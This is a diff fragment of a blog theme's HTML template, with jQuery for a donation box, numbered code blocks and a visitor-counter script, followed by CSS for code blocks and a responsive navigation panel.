+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
